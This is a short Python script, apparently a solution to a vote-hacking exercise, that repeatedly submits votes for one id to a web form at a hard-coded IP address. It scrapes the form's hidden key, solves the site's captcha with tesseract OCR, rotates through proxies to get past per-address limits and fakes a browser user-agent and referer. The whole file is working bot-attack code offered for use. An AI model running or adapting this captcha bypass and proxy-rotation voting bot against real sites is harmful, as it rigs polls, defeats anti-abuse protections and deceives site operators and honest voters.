#!/usr/bin/python3

import requests
import os
from bs4 import BeautifulSoup
proxy = __import__('proxis').Proxi


def o_read():
    with open("/tmp/cap.txt") as f:
        texto = f.read(4).replace('\n', '')
        f.close
        return(texto)


def o_write(content):
    with open("/tmp/capt.png", "wb") as f:
        f.write(content)
        f.close


def get_cap():
    exec('import subprocess; subprocess.call(["tesseract", \
        "/tmp/capt.png", "/tmp/cap"])')


url_u = "http://158.69.76.135/level4.php"
url_c = "http://158.69.76.135/captcha.php"
data_form = {"id": "3819", "holdthedoor": "Submit", "key": "", "captcha": ""}
tuheader = {"user-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) "
            "Gecko/20100101 Firefox/47.0", "referer": url_u}
proxies = {"captcha": ""}

i = 0
while (i != 98):
    new1 = proxy()

    for ip in new1.get_proxi():
        proxies["http"] = "http://" + ip
        print("conectando a {}".format(ip))
        try:

            new_session = requests.session()
            html = new_session.get(url_u)
            token = BeautifulSoup(html.text, "html.parser")

            hidden_key = token.find("form", {"method": "post"})
            hidden_key = hidden_key.find("input", {"type": "hidden"})
            data_form["key"] = hidden_key["value"]

            o_write(new_session.get(url_c).content)
            get_cap()
            os.remove("/tmp/capt.png")
            data_form["captcha"] = o_read()
            new_session.post(url_u, data=data_form, headers=tuheader)
            i = i + 1
            print("succesful vote")
        except:
            print("fallo de conección")
